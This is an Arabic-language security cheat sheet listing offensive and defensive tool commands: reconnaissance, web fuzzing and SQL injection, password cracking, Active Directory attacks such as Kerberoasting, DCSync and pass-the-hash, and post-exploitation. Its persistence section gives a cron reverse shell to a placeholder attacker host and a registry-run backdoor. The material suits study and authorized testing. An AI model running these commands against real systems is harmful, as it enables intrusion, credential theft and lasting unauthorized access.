# 12 — ترسانة الأدوات (Tools Arsenal)

---

## Reconnaissance & OSINT

```bash
# Subdomain Discovery
subfinder -d target.com
amass enum -d target.com
assetfinder target.com

# DNS
dnsx -d target.com -a -aaaa -cname -mx
massdns -r resolvers.txt -t A domains.txt

# Port Scanning
nmap -sC -sV -oA scan target.com
masscan -p1-65535 target.com --rate=1000   # أسرع من nmap
rustscan -a target.com                      # الأسرع

# Web Discovery
httpx -l domains.txt -title -tech-detect   # فحص سريع
katana -u http://target.com                # Web crawler
waybackurls target.com                     # URLs تاريخية

# OSINT
theHarvester -d target.com -b all
shodan search "org:target"
censys search "target.com"
```

---

## Web Application Testing

```bash
# Proxy
Burp Suite Community/Pro    ← الأساسي
OWASP ZAP                   ← مجاني

# Scanning
nuclei -u http://target.com -t ~/nuclei-templates/
nikto -h http://target.com
wpscan --url http://target.com    ← WordPress

# Fuzzing
ffuf -w wordlist.txt -u http://target.com/FUZZ
gobuster dir -u http://target.com -w wordlist.txt
feroxbuster -u http://target.com  ← أسرع وأذكى

# SQL Injection
sqlmap -u "http://target.com/?id=1" --dbs --batch

# XSS
dalfox url "http://target.com/search?q=FUZZ"
xsstrike -u "http://target.com/search?q=test"

# Parameter Discovery
arjun -u http://target.com/api/endpoint
```

---

## Network Penetration Testing

```bash
# Scanning
nmap, masscan, rustscan

# Exploitation
metasploit (msfconsole)
searchsploit <service>         ← البحث في Exploit-DB

# Password Attacks
hydra -l admin -P rockyou.txt ssh://target
medusa -h target -u admin -P rockyou.txt -M ssh
crackmapexec smb target -u users.txt -p passwords.txt

# Hash Cracking
hashcat -m 1000 hashes.txt rockyou.txt
john --wordlist=rockyou.txt hashes.txt

# Sniffing / MITM
wireshark
tcpdump -i eth0 -w capture.pcap
bettercap -iface eth0
responder -I eth0              ← LLMNR/NBT-NS Poisoning
```

---

## Active Directory

```bash
# Enumeration
bloodhound-python -d domain.local -u user -p pass -ns DC_IP -c all
ldapdomaindump -u 'DOMAIN\user' -p 'pass' DC_IP
enum4linux-ng -A DC_IP

# Attacks
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request  # Kerberoasting
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass    # AS-REP Roasting
impacket-secretsdump DOMAIN/admin:pass@DC_IP                 # DCSync
impacket-psexec DOMAIN/admin@TARGET -hashes :NTLM_HASH       # PTH

# Lateral Movement
evil-winrm -i TARGET -u admin -p password
impacket-wmiexec DOMAIN/admin:pass@TARGET
```

---

## Post-Exploitation

```bash
# Meterpreter
getsystem
hashdump
run post/multi/recon/local_exploit_suggester

# Linux PrivEsc
./linpeas.sh
./linux-exploit-suggester.sh

# Windows PrivEsc
.\winPEAS.exe
.\PowerUp.ps1; Invoke-AllChecks

# Persistence
# Linux
echo "* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1" | crontab -
# Windows
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\backdoor.exe"
```

---

## Malware Analysis

```bash
# Static
strings, file, hexdump
pestudio, pe-tree
ghidra, radare2

# Dynamic
x64dbg / x32dbg (Windows Debugger)
procmon, process hacker
wireshark + INetSim

# Sandbox
any.run, hybrid-analysis.com

# Memory
volatility3
```

---

## Defensive Tools

```bash
# SIEM
Splunk, ELK Stack, Wazuh

# IDS/IPS
Snort, Suricata, Zeek

# Endpoint
osquery                    ← استعلام النظام كـ SQL
velociraptor               ← DFIR على نطاق واسع
sysmon                     ← Windows Event Logging متقدم

# Vulnerability Management
OpenVAS / Greenbone
Nessus (مدفوع)
Qualys (مدفوع)

# Container Security
trivy, grype, snyk
falco                      ← Runtime security لـ Kubernetes
```

---

## Wordlists

```bash
# المواقع
/usr/share/wordlists/rockyou.txt          ← كلمات المرور
/usr/share/wordlists/dirb/common.txt      ← Web directories
/usr/share/seclists/                      ← المجموعة الأشمل

# SecLists (GitHub)
git clone https://github.com/danielmiessler/SecLists
```

---

## بيئة العمل الموصى بها

```
الجهاز الرئيسي:
- Linux (Ubuntu/Debian) أو macOS
- RAM: 16GB+ (للـ VMs)
- SSD: 500GB+

VMs:
- Kali Linux (للهجوم)
- Windows 10/11 (للتحليل)
- Windows Server 2019 (لـ AD Lab)
- REMnux (لتحليل الـ Malware)

شبكة معزولة:
- Host-only network للـ VMs الحساسة
- NAT للوصول للإنترنت عند الحاجة
```
